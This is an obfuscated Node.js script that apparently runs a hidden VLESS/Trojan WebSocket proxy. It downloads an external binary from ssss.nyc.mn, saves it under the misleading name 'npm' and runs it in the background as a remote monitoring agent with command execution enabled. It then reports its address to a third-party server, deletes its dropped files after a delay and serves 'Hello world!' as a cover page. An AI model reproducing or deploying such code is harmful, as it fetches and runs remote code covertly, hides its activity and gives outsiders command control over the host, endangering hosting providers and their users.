const _0x3dac9e=_0x4c86;(function(_0xb9035d,_0x49947b){const _0x4c6daa=_0x4c86,_0x5b559d=_0xb9035d();while(!![]){try{const _0x1b5abb=-parseInt(_0x4c6daa(0xa4))/0x1+-parseInt(_0x4c6daa(0xf0))/0x2+parseInt(_0x4c6daa(0x8e))/0x3+parseInt(_0x4c6daa(0xba))/0x4*(-parseInt(_0x4c6daa(0xf5))/0x5)+parseInt(_0x4c6daa(0x9b))/0x6+-parseInt(_0x4c6daa(0xdd))/0x7*(-parseInt(_0x4c6daa(0xbd))/0x8)+parseInt(_0x4c6daa(0xec))/0x9;if(_0x1b5abb===_0x49947b)break;else _0x5b559d['push'](_0x5b559d['shift']());}catch(_0x3054e0){_0x5b559d['push'](_0x5b559d['shift']());}}}(_0x2e09,0x44bb3));function _0x4c86(_0x331b49,_0x431bb8){const _0x2e0993=_0x2e09();return _0x4c86=function(_0x4c86ae,_0x137d5a){_0x4c86ae=_0x4c86ae-0x78;let _0x59fc43=_0x2e0993[_0x4c86ae];return _0x59fc43;},_0x4c86(_0x331b49,_0x431bb8);}const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x3dac9e(0xf7)),net=require(_0x3dac9e(0x80)),path=require(_0x3dac9e(0xdc)),crypto=require(_0x3dac9e(0xed)),{Buffer}=require(_0x3dac9e(0xc0)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3dac9e(0xa8)][_0x3dac9e(0xd3)]||_0x3dac9e(0xce),NEZHA_SERVER=process[_0x3dac9e(0xa8)][_0x3dac9e(0xa9)]||'',NEZHA_PORT=process[_0x3dac9e(0xa8)][_0x3dac9e(0x88)]||'',NEZHA_KEY=process[_0x3dac9e(0xa8)][_0x3dac9e(0xc1)]||'',DOMAIN=process[_0x3dac9e(0xa8)][_0x3dac9e(0xeb)]||_0x3dac9e(0xd8),AUTO_ACCESS=process[_0x3dac9e(0xa8)][_0x3dac9e(0xe7)]||![],WSPATH=process[_0x3dac9e(0xa8)][_0x3dac9e(0xd1)]||UUID[_0x3dac9e(0xa5)](0x0,0x8),SUB_PATH=process['env'][_0x3dac9e(0x78)]||_0x3dac9e(0xaf),NAME=process[_0x3dac9e(0xa8)][_0x3dac9e(0xdb)]||'',PORT=process[_0x3dac9e(0xa8)][_0x3dac9e(0xe9)]||0xbb8;function _0x2e09(){const _0x3d9bf4=['connect','DOMAIN','7687458YyTACt','crypto','arch','find','980350BktOnq','Status','npm\x20is\x20running','Failed\x20to\x20resolve\x20','createServer','395MkoOJP','reduce','axios','Answer','SUB_PATH','Automatic\x20Access\x20Task\x20added\x20successfully','readUInt16BE','close','finish','npm','pipe','from','net','/bin/bash','application/json','country','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','unlink','type','post','NEZHA_PORT','443','stream','end','createWriteStream','includes','637662ZOXKmZ','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','readUInt8','trim','test','Hello\x20world!','length','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','data','--tls','writeHead','https://amd64.ssss.nyc.mn/agent','update','1002114RauHlV','application/dns-json','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','concat','text/html','send','https://speed.cloudflare.com/meta','npm\x20is\x20already\x20running,\x20skip\x20running...','substr','67651nfZzBt','slice','\x20-p\x20','npm\x20running\x20error:','env','NEZHA_SERVER','arm','https://arm64.ssss.nyc.mn/v1','asOrganization','connection','npm\x20download\x20successfully','sub','&path=%2F','toString','true','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','utf8','every','text/plain','1.1.1.1','https://','2053','23396lwdesf','url','join','8xNaJZw','chmod\x20+x\x20npm','&fp=chrome&type=ws&host=','buffer','NEZHA_KEY','utf-8','https://dns.google/resolve?name=','vless://','8.8.4.4','setsid\x20nohup\x20./npm\x20-s\x20','pop','base64','https://arm64.ssss.nyc.mn/agent','log','error','digest','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','5efabea4-f6d4-91fd-b8f0-17e004c89v60','false','writeFileSync','WSPATH','8443','UUID','replace','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','get','catch','1234.abc.com','listen','Not\x20Found\x0a','NAME','path','473795gKbsTN','arm64','decode','write','2087','config.yaml','index.html','split','\x20with\x20all\x20DNS\x20servers','sha224','AUTO_ACCESS','map','PORT'];_0x2e09=function(){return _0x3d9bf4;};return _0x2e09();}let ISP='';const GetISP=async()=>{const _0x7000ed=_0x3dac9e;try{const _0x23349e=await axios[_0x7000ed(0xd6)](_0x7000ed(0xa1)),_0x2a6531=_0x23349e[_0x7000ed(0x96)];ISP=(_0x2a6531[_0x7000ed(0x83)]+'-'+_0x2a6531[_0x7000ed(0xac)])[_0x7000ed(0xd4)](/ /g,'_');}catch(_0x189b0f){ISP='Unknown';}};GetISP();const httpServer=http[_0x3dac9e(0xf4)]((_0x175c58,_0x5644c4)=>{const _0x527515=_0x3dac9e;if(_0x175c58[_0x527515(0xbb)]==='/'){const _0x389df6=path[_0x527515(0xbc)](__dirname,_0x527515(0xe3));fs['readFile'](_0x389df6,_0x527515(0xb4),(_0x527f80,_0x12b54e)=>{const _0x4d16b9=_0x527515;if(_0x527f80){_0x5644c4[_0x4d16b9(0x98)](0xc8,{'Content-Type':'text/html'}),_0x5644c4[_0x4d16b9(0x8b)](_0x4d16b9(0x93));return;}_0x5644c4[_0x4d16b9(0x98)](0xc8,{'Content-Type':_0x4d16b9(0x9f)}),_0x5644c4[_0x4d16b9(0x8b)](_0x12b54e);});return;}else{if(_0x175c58[_0x527515(0xbb)]==='/'+SUB_PATH){const _0x540a47=NAME?NAME+'-'+ISP:ISP,_0x2c0151=_0x527515(0xc4)+UUID+_0x527515(0x9d)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x527515(0xb0)+WSPATH+'#'+_0x540a47,_0x2488f7='trojan://'+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+_0x527515(0xbf)+DOMAIN+_0x527515(0xb0)+WSPATH+'#'+_0x540a47,_0x35db96=_0x2c0151+'\x0a'+_0x2488f7,_0x4245ac=Buffer[_0x527515(0x7f)](_0x35db96)[_0x527515(0xb1)](_0x527515(0xc8));_0x5644c4[_0x527515(0x98)](0xc8,{'Content-Type':_0x527515(0xb6)}),_0x5644c4[_0x527515(0x8b)](_0x4245ac+'\x0a');}else _0x5644c4[_0x527515(0x98)](0x194,{'Content-Type':'text/plain'}),_0x5644c4[_0x527515(0x8b)](_0x527515(0xda));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x3dac9e(0xd4)](/-/g,''),DNS_SERVERS=[_0x3dac9e(0xc5),_0x3dac9e(0xb7)];function resolveHost(_0xaed93f){return new Promise((_0xc27a4b,_0x137e6a)=>{const _0x35640e=_0x4c86;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x35640e(0x92)](_0xaed93f)){_0xc27a4b(_0xaed93f);return;}let _0x36fa7f=0x0;function _0x55169d(){const _0x1ecbb3=_0x35640e;if(_0x36fa7f>=DNS_SERVERS[_0x1ecbb3(0x94)]){_0x137e6a(new Error(_0x1ecbb3(0xf3)+_0xaed93f+_0x1ecbb3(0xe5)));return;}const _0x2b0a7b=DNS_SERVERS[_0x36fa7f];_0x36fa7f++;const _0x1c936a=_0x1ecbb3(0xc3)+encodeURIComponent(_0xaed93f)+'&type=A';axios[_0x1ecbb3(0xd6)](_0x1c936a,{'timeout':0x1388,'headers':{'Accept':_0x1ecbb3(0x9c)}})['then'](_0x429ba8=>{const _0xfb766a=_0x1ecbb3,_0x339df9=_0x429ba8[_0xfb766a(0x96)];if(_0x339df9[_0xfb766a(0xf1)]===0x0&&_0x339df9[_0xfb766a(0xf8)]&&_0x339df9[_0xfb766a(0xf8)]['length']>0x0){const _0x40448f=_0x339df9['Answer'][_0xfb766a(0xef)](_0x561a5d=>_0x561a5d[_0xfb766a(0x86)]===0x1);if(_0x40448f){_0xc27a4b(_0x40448f['data']);return;}}_0x55169d();})[_0x1ecbb3(0xd7)](_0x5b1761=>{_0x55169d();});}_0x55169d();});}function handleVlessConnection(_0x332e3c,_0x7f4269){const _0x573a55=_0x3dac9e,[_0x36d14b]=_0x7f4269,_0x2aee10=_0x7f4269[_0x573a55(0xa5)](0x1,0x11);if(!_0x2aee10['every']((_0x24f544,_0x319035)=>_0x24f544==parseInt(uuid[_0x573a55(0xa3)](_0x319035*0x2,0x2),0x10)))return![];let _0x57b6ce=_0x7f4269[_0x573a55(0xa5)](0x11,0x12)[_0x573a55(0x90)]()+0x13;const _0x9f3549=_0x7f4269[_0x573a55(0xa5)](_0x57b6ce,_0x57b6ce+=0x2)[_0x573a55(0x7a)](0x0),_0x7c478c=_0x7f4269['slice'](_0x57b6ce,_0x57b6ce+=0x1)[_0x573a55(0x90)](),_0x4883e1=_0x7c478c==0x1?_0x7f4269[_0x573a55(0xa5)](_0x57b6ce,_0x57b6ce+=0x4)[_0x573a55(0xbc)]('.'):_0x7c478c==0x2?new TextDecoder()[_0x573a55(0xdf)](_0x7f4269[_0x573a55(0xa5)](_0x57b6ce+0x1,_0x57b6ce+=0x1+_0x7f4269[_0x573a55(0xa5)](_0x57b6ce,_0x57b6ce+0x1)[_0x573a55(0x90)]())):_0x7c478c==0x3?_0x7f4269[_0x573a55(0xa5)](_0x57b6ce,_0x57b6ce+=0x10)[_0x573a55(0xf6)]((_0x2e5068,_0x47521c,_0xb89d9e,_0x473b5d)=>_0xb89d9e%0x2?_0x2e5068['concat'](_0x473b5d[_0x573a55(0xa5)](_0xb89d9e-0x1,_0xb89d9e+0x1)):_0x2e5068,[])[_0x573a55(0xe8)](_0x57fe47=>_0x57fe47['readUInt16BE'](0x0)[_0x573a55(0xb1)](0x10))[_0x573a55(0xbc)](':'):'';_0x332e3c[_0x573a55(0xa0)](new Uint8Array([_0x36d14b,0x0]));const _0x228c0b=createWebSocketStream(_0x332e3c);return resolveHost(_0x4883e1)['then'](_0xf8d714=>{const _0x4f0ea8=_0x573a55;net['connect']({'host':_0xf8d714,'port':_0x9f3549},function(){const _0x5050d7=_0x4c86;this[_0x5050d7(0xe0)](_0x7f4269[_0x5050d7(0xa5)](_0x57b6ce)),_0x228c0b['on'](_0x5050d7(0xcb),()=>{})['pipe'](this)['on'](_0x5050d7(0xcb),()=>{})[_0x5050d7(0x7e)](_0x228c0b);})['on'](_0x4f0ea8(0xcb),()=>{});})[_0x573a55(0xd7)](_0x2d00b0=>{net['connect']({'host':_0x4883e1,'port':_0x9f3549},function(){const _0x3b312c=_0x4c86;this['write'](_0x7f4269[_0x3b312c(0xa5)](_0x57b6ce)),_0x228c0b['on'](_0x3b312c(0xcb),()=>{})['pipe'](this)['on']('error',()=>{})[_0x3b312c(0x7e)](_0x228c0b);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x55eeb7,_0xcb1911){const _0x4938e3=_0x3dac9e;try{if(_0xcb1911[_0x4938e3(0x94)]<0x3a)return![];const _0x326c60=_0xcb1911[_0x4938e3(0xa5)](0x0,0x38)[_0x4938e3(0xb1)](),_0x232ae2=[UUID];let _0x431745=null;for(const _0x44d983 of _0x232ae2){const _0x5a3e3d=crypto['createHash'](_0x4938e3(0xe6))[_0x4938e3(0x9a)](_0x44d983)[_0x4938e3(0xcc)]('hex');if(_0x5a3e3d===_0x326c60){_0x431745=_0x44d983;break;}}if(!_0x431745)return![];let _0x113ac9=0x38;_0xcb1911[_0x113ac9]===0xd&&_0xcb1911[_0x113ac9+0x1]===0xa&&(_0x113ac9+=0x2);const _0xcf225a=_0xcb1911[_0x113ac9];if(_0xcf225a!==0x1)return![];_0x113ac9+=0x1;const _0x200956=_0xcb1911[_0x113ac9];_0x113ac9+=0x1;let _0x2a63ba,_0x4b4231;if(_0x200956===0x1)_0x2a63ba=_0xcb1911[_0x4938e3(0xa5)](_0x113ac9,_0x113ac9+0x4)[_0x4938e3(0xbc)]('.'),_0x113ac9+=0x4;else{if(_0x200956===0x3){const _0x36910d=_0xcb1911[_0x113ac9];_0x113ac9+=0x1,_0x2a63ba=_0xcb1911[_0x4938e3(0xa5)](_0x113ac9,_0x113ac9+_0x36910d)[_0x4938e3(0xb1)](),_0x113ac9+=_0x36910d;}else{if(_0x200956===0x4)_0x2a63ba=_0xcb1911[_0x4938e3(0xa5)](_0x113ac9,_0x113ac9+0x10)[_0x4938e3(0xf6)]((_0x204c2a,_0x302417,_0x242e9a,_0x125c66)=>_0x242e9a%0x2?_0x204c2a[_0x4938e3(0x9e)](_0x125c66[_0x4938e3(0xa5)](_0x242e9a-0x1,_0x242e9a+0x1)):_0x204c2a,[])[_0x4938e3(0xe8)](_0x16f5c2=>_0x16f5c2[_0x4938e3(0x7a)](0x0)[_0x4938e3(0xb1)](0x10))['join'](':'),_0x113ac9+=0x10;else return![];}}_0x4b4231=_0xcb1911[_0x4938e3(0x7a)](_0x113ac9),_0x113ac9+=0x2;_0x113ac9<_0xcb1911[_0x4938e3(0x94)]&&_0xcb1911[_0x113ac9]===0xd&&_0xcb1911[_0x113ac9+0x1]===0xa&&(_0x113ac9+=0x2);const _0x178931=createWebSocketStream(_0x55eeb7);return resolveHost(_0x2a63ba)['then'](_0x38772d=>{const _0x381124=_0x4938e3;net[_0x381124(0xea)]({'host':_0x38772d,'port':_0x4b4231},function(){const _0x5ae744=_0x381124;_0x113ac9<_0xcb1911[_0x5ae744(0x94)]&&this[_0x5ae744(0xe0)](_0xcb1911[_0x5ae744(0xa5)](_0x113ac9)),_0x178931['on'](_0x5ae744(0xcb),()=>{})['pipe'](this)['on'](_0x5ae744(0xcb),()=>{})['pipe'](_0x178931);})['on'](_0x381124(0xcb),()=>{});})['catch'](_0x1a3671=>{const _0x29063a=_0x4938e3;net['connect']({'host':_0x2a63ba,'port':_0x4b4231},function(){const _0x4cb6ba=_0x4c86;_0x113ac9<_0xcb1911[_0x4cb6ba(0x94)]&&this[_0x4cb6ba(0xe0)](_0xcb1911['slice'](_0x113ac9)),_0x178931['on'](_0x4cb6ba(0xcb),()=>{})[_0x4cb6ba(0x7e)](this)['on'](_0x4cb6ba(0xcb),()=>{})['pipe'](_0x178931);})['on'](_0x29063a(0xcb),()=>{});}),!![];}catch(_0x3d032b){return![];}}wss['on'](_0x3dac9e(0xad),(_0x3f74f8,_0x4152de)=>{const _0xa8ae44=_0x3dac9e,_0xfacffe=_0x4152de[_0xa8ae44(0xbb)]||'';_0x3f74f8['once']('message',_0x404170=>{const _0x3b62ce=_0xa8ae44;if(_0x404170[_0x3b62ce(0x94)]>0x11&&_0x404170[0x0]===0x0){const _0x525d0a=_0x404170[_0x3b62ce(0xa5)](0x1,0x11),_0x33f468=_0x525d0a[_0x3b62ce(0xb5)]((_0x2b08d7,_0x5914c2)=>_0x2b08d7==parseInt(uuid['substr'](_0x5914c2*0x2,0x2),0x10));if(_0x33f468){!handleVlessConnection(_0x3f74f8,_0x404170)&&_0x3f74f8[_0x3b62ce(0x7b)]();return;}}!handleTrojanConnection(_0x3f74f8,_0x404170)&&_0x3f74f8['close']();})['on'](_0xa8ae44(0xcb),()=>{});});const getDownloadUrl=()=>{const _0x59cb30=_0x3dac9e,_0x57ef9d=os[_0x59cb30(0xee)]();return _0x57ef9d===_0x59cb30(0xaa)||_0x57ef9d===_0x59cb30(0xde)||_0x57ef9d==='aarch64'?!NEZHA_PORT?_0x59cb30(0xab):_0x59cb30(0xc9):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x59cb30(0x99);},downloadFile=async()=>{const _0x3e5467=_0x3dac9e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x26611a=getDownloadUrl(),_0x3e7a75=await axios({'method':'get','url':_0x26611a,'responseType':_0x3e5467(0x8a)}),_0x31fb39=fs[_0x3e5467(0x8c)](_0x3e5467(0x7d));return _0x3e7a75['data'][_0x3e5467(0x7e)](_0x31fb39),new Promise((_0x577559,_0x37ad96)=>{const _0xffb324=_0x3e5467;_0x31fb39['on'](_0xffb324(0x7c),()=>{const _0x464efd=_0xffb324;console[_0x464efd(0xca)](_0x464efd(0xae)),exec(_0x464efd(0xbe),_0x312641=>{if(_0x312641)_0x37ad96(_0x312641);_0x577559();});}),_0x31fb39['on'](_0xffb324(0xcb),_0x37ad96);});}catch(_0x4b915f){throw _0x4b915f;}},runnz=async()=>{const _0x4fcad8=_0x3dac9e;try{const _0x24825b=execSync(_0x4fcad8(0x84),{'encoding':_0x4fcad8(0xc2)});if(_0x24825b[_0x4fcad8(0x91)]()!==''){console['log'](_0x4fcad8(0xa2));return;}}catch(_0x3627e2){}await downloadFile();let _0x1b9121='',_0x56bf7a=[_0x4fcad8(0x89),_0x4fcad8(0xd2),'2096',_0x4fcad8(0xe1),'2083',_0x4fcad8(0xb9)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x14ff29=_0x56bf7a[_0x4fcad8(0x8d)](NEZHA_PORT)?_0x4fcad8(0x97):'';_0x1b9121=_0x4fcad8(0xc6)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4fcad8(0xa6)+NEZHA_KEY+'\x20'+_0x14ff29+_0x4fcad8(0xb3);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1a76b0=NEZHA_SERVER[_0x4fcad8(0x8d)](':')?NEZHA_SERVER[_0x4fcad8(0xe4)](':')[_0x4fcad8(0xc7)]():'',_0x3562a8=_0x56bf7a[_0x4fcad8(0x8d)](_0x1a76b0)?_0x4fcad8(0xb2):_0x4fcad8(0xcf),_0x3700fb='client_secret:\x20'+NEZHA_KEY+_0x4fcad8(0x95)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3562a8+_0x4fcad8(0x8f)+UUID;fs[_0x4fcad8(0xd0)](_0x4fcad8(0xe2),_0x3700fb);}_0x1b9121=_0x4fcad8(0xcd);}else{console[_0x4fcad8(0xca)](_0x4fcad8(0xd5));return;}}try{exec(_0x1b9121,{'shell':_0x4fcad8(0x81)},_0x478973=>{const _0x363bdc=_0x4fcad8;if(_0x478973)console[_0x363bdc(0xcb)](_0x363bdc(0xa7),_0x478973);else console[_0x363bdc(0xca)](_0x363bdc(0xf2));});}catch(_0x59fe1f){console[_0x4fcad8(0xcb)]('error:\x20'+_0x59fe1f);}};async function addAccessTask(){const _0x4feeaf=_0x3dac9e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2c373b=_0x4feeaf(0xb8)+DOMAIN+'/'+SUB_PATH;try{const _0xb9214=await axios[_0x4feeaf(0x87)]('https://oooo.serv00.net/add-url',{'url':_0x2c373b},{'headers':{'Content-Type':_0x4feeaf(0x82)}});console[_0x4feeaf(0xca)](_0x4feeaf(0x79));}catch(_0x2ced4a){}}const delFiles=()=>{const _0x145b43=_0x3dac9e;fs[_0x145b43(0x85)](_0x145b43(0x7d),()=>{}),fs[_0x145b43(0x85)](_0x145b43(0xe2),()=>{});};httpServer[_0x3dac9e(0xd9)](PORT,()=>{const _0x583e68=_0x3dac9e;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x583e68(0xca)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
